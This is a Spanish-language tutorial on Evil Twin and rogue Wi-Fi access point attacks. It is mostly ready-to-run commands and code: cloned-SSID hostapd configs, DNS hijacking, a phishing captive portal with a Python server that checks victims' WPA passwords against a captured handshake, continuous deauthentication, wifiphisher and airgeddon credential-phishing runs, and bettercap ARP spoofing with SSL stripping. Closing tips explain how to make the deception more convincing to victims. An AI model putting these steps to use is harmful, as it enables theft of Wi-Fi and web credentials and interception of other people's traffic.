# Evil Twin y Rogue AP

Evil Twin es un ataque en el que se crea un punto de acceso falso que suplanta al legítimo con el mismo SSID (y opcionalmente el mismo BSSID). Los clientes se conectan al AP falso creyendo que es el legítimo, permitiendo al atacante capturar credenciales o interceptar tráfico.

```
Red legítima:  [Router real] ←→ [Clientes]
                SSID: MiWiFi

Evil Twin:     [Router FALSO] ←→ [Clientes desconectados del real]
                SSID: MiWiFi   ↑
                               Deauth continuo al router real
```

### Tipos de ataque Evil Twin

```
1. Captura de contraseña WPA:
   → Portal cautivo que pide la contraseña del Wi-Fi
   → Se verifica contra el hash capturado para confirmar que es correcta

2. Phishing de credenciales web:
   → Portal que simula una página de login (Google, banco, red social)
   → El cliente introduce sus credenciales creyendo estar en la página real

3. MITM en red abierta (Rogue AP):
   → AP abierto para capturar tráfico HTTP
   → El cliente tiene internet pero el atacante ve todo su tráfico

4. Evil Twin Enterprise:
   → Para redes WPA2 Enterprise (RADIUS)
   → Captura el hash MSCHAPV2 de autenticación
```

### Método 1 — Evil Twin manual con hostapd

#### Preparación de interfaces

```bash
# Necesitas DOS interfaces Wi-Fi:
# wlan0 → AP falso (en modo AP)
# wlan1 → conexión a internet para los clientes (opcional, para Rogue AP)
# O solo wlan0 para capturar contraseñas sin dar internet

# Activar modo monitor en wlan1 (para el deauth al AP legítimo)
airmon-ng start wlan1

# Dejar wlan0 en modo managed (hostapd lo pone en modo AP automáticamente)
```

#### Configurar el AP falso con hostapd

```bash
# Crear /etc/hostapd/evil_twin.conf
cat > /etc/hostapd/evil_twin.conf << EOF
interface=wlan0
driver=nl80211
ssid=NombreRedObjetivo
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
# Para usar el mismo BSSID que el AP legítimo (más convincente):
bssid=AA:BB:CC:DD:EE:FF
EOF

# Iniciar el AP falso
hostapd /etc/hostapd/evil_twin.conf
```

#### Configurar servidor DHCP

```bash
# Los clientes necesitan IP para conectarse al portal
# Instalar y configurar dnsmasq

cat > /etc/dnsmasq_evil.conf << EOF
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-facility=/var/log/dnsmasq.log
EOF

# Asignar IP a wlan0
ip addr add 192.168.1.1/24 dev wlan0
ip link set wlan0 up

# Iniciar dnsmasq
dnsmasq -C /etc/dnsmasq_evil.conf
```

#### DNS falso que redirige todo al portal

```bash
# Añadir al dnsmasq.conf para redirigir todas las peticiones DNS al portal:
echo "address=/#/192.168.1.1" >> /etc/dnsmasq_evil.conf
# Esto hace que CUALQUIER dominio resuelva a 192.168.1.1

# Reiniciar dnsmasq
pkill dnsmasq
dnsmasq -C /etc/dnsmasq_evil.conf
```

#### Portal web para capturar la contraseña WPA

```bash
# Crear portal web básico con Python
mkdir -p /var/www/portal

cat > /var/www/portal/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Actualización de red requerida</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 100px; }
        input { width: 300px; padding: 10px; margin: 10px; }
        button { background: #0066cc; color: white; padding: 10px 30px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>🔒 Reconexión requerida</h2>
    <p>Se ha detectado un error de autenticación. Por favor, introduzca la contraseña del Wi-Fi para continuar.</p>
    <form method="POST" action="/verify">
        <input type="password" name="pass" placeholder="Contraseña del Wi-Fi" required><br>
        <button type="submit">Conectar</button>
    </form>
</body>
</html>
EOF

# Script Python para el servidor web (verifica la contraseña contra el hash)
cat > /var/www/portal/server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import subprocess, os

HASH_FILE = "/tmp/handshake.22000"  # hash capturado previamente

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/var/www/portal/index.html', 'rb') as f:
            content = f.read()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)
        password = params.get('pass', [''])[0]

        # Verificar la contraseña contra el hash capturado
        result = subprocess.run(
            ['aircrack-ng', HASH_FILE, '-w', '-', '--'],
            input=password.encode(), capture_output=True
        )

        if b'KEY FOUND' in result.stdout:
            print(f"\n[+] CONTRASEÑA CORRECTA: {password}")
            # Redirigir a internet (dar acceso real)
            self.send_response(302)
            self.send_header('Location', 'http://www.google.com')
        else:
            print(f"[-] Contraseña incorrecta: {password}")
            # Volver a pedir la contraseña
            self.send_response(302)
            self.send_header('Location', '/')
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(('192.168.1.1', 80), Handler).serve_forever()
EOF

# Iniciar el servidor web del portal
python3 /var/www/portal/server.py &
```

#### Deauth continuo al AP legítimo

```bash
# Terminal separada: deauth continuo para forzar a los clientes al Evil Twin
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan1mon
# -0 0 → deauth infinito
# Los clientes se reconectarán al AP con mayor señal → nuestro Evil Twin
```

### Método 2 — Airgeddon (automatizado, recomendado)

```bash
# Instalación
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
bash airgeddon.sh

# En el menú de airgeddon:
# 1. Seleccionar interfaz
# 2. Poner interfaz en modo monitor
# 3. "5" → Evil Twin attacks
# 4. Dentro del menú Evil Twin:
#    "9"  → Evil Twin AP attack with captive portal (WPA/WPA2)
#    "10" → Evil Twin AP attack with captive portal + HTTPS (solo WPA2)

# Airgeddon pide:
# → Archivo de handshake capturado previamente
# → Interfaz para el AP falso
# → Interfaz para el deauth

# Airgeddon crea automáticamente:
# → El AP falso con el mismo SSID
# → El servidor DHCP y DNS
# → El portal cautivo con verificación de contraseña
# → El deauth continuo al AP legítimo

# Ventanas abiertas por airgeddon:
# → Ventana del AP (hostapd)
# → Ventana del DHCP (dnsmasq)
# → Ventana del deauth (aireplay-ng)
# → Ventana del portal web
# → Ventana de captura (muestra las contraseñas introducidas)
```

### Método 3 — Wifiphisher (phishing de credenciales web)

```bash
# Instalación
pip3 install wifiphisher
# o
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher && python3 setup.py install

# Ataque básico → muestra menú para seleccionar la red objetivo
sudo wifiphisher

# Especificar red objetivo y template
sudo wifiphisher \
    --essid "NombreRedObjetivo" \
    -phishingscenario firmware-upgrade

# Templates disponibles:
# firmware-upgrade     → "Actualización de firmware del router"
# wifi-connect         → Portal estilo hotel/aeropuerto
# oauth-login          → Login falso con Google/Facebook
# plugin_update        → Actualización de plugin del navegador
# office365-login      → Portal de Office 365 falso
# browser_plugin_update → "Actualiza tu navegador"

# Especificar interfaz
sudo wifiphisher -aI wlan0 -jI wlan1 \
    --essid "NombreRedObjetivo" \
    -phishingscenario firmware-upgrade \
    --force-hostapd

# Las credenciales capturadas se muestran en tiempo real en la consola
```

### Rogue AP - Captura de tráfico sin credenciales

Un Rogue AP es un AP abierto (sin contraseña) diseñado para capturar todo el tráfico de los clientes que se conecten.

```bash
# Crear AP abierto con hostapd
cat > /etc/hostapd/rogue_ap.conf << EOF
interface=wlan0
driver=nl80211
ssid=WiFi_Gratis
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Sin contraseña = red abierta
EOF

hostapd /etc/hostapd/rogue_ap.conf &

# Configurar NAT para dar internet real (hace el AP más convincente)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Capturar TODO el tráfico del AP
tcpdump -i wlan0 -w trafico_rogue.pcap

# Análisis en tiempo real con net-creds
python3 net-creds.py -i wlan0

# O con bettercap para MITM completo
bettercap -iface wlan0
# En bettercap:
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
set https.proxy.sslstrip true
https.proxy on
```

### Detección de clientes conectados al Evil Twin

```bash
# Ver qué clientes se conectaron a nuestro AP falso
# En otra terminal mientras hostapd está activo:

# Con iw
iw dev wlan0 station dump

# Con arp
arp -a

# En los logs de dnsmasq
tail -f /var/log/dnsmasq.log
# Muestra: DHCPDISCOVER, DHCPOFFER, DHCPREQUEST, DHCPACK
# → Cada DHCPACK es un cliente conectado
```

### Notas importantes

```
Maximizar la efectividad del Evil Twin:

1. Señal más potente que el AP legítimo
   → Usar antena externa o adaptador de mayor potencia
   → Colocarse más cerca de los clientes objetivo que el router legítimo

2. Mismo canal que el AP legítimo
   → Los clientes prefieren el AP con mayor señal en el mismo canal
   → Cambiar el canal del Evil Twin al del AP real

3. Mismo BSSID (MAC) que el AP legítimo
   → Algunos sistemas cliente se conectan automáticamente al BSSID conocido
   → macchanger -m AA:BB:CC:DD:EE:FF wlan0 (antes de iniciar hostapd)

4. Deauth efectivo
   → Si el AP real tiene Management Frame Protection (802.11w)
     los deauth no funcionan → necesitas más señal sin deauth
   → Verificar: airodump-ng → columna "CIPHER" o "AUTH"
     RSN con MFP → 802.11w activo

5. Portal convincente
   → El portal debe verse exactamente igual que el del proveedor real
   → ISPs españoles: Movistar, Vodafone, Orange tienen portales conocidos
   → Wifiphisher tiene templates que simulan portales de routers reales
```

> Airgeddon es la herramienta más completa para Evil Twin: automatiza todas las piezas (AP falso, DHCP, DNS, deauth, portal) y verifica automáticamente si la contraseña introducida por la víctima es correcta comparándola con el handshake capturado.

> El Evil Twin es más efectivo cuando se usa en entornos donde los usuarios están acostumbrados a ver portales cautivos (hoteles, aeropuertos, centros comerciales) porque el usuario ve el portal como algo normal y no sospechoso.

> Si el AP legítimo tiene Management Frame Protection (MFP/802.11w), los paquetes de deauth serán ignorados. En ese caso, el Evil Twin funciona igualmente si tiene mejor señal que el AP real, pero la desconexión del cliente del AP legítimo no se puede forzar.
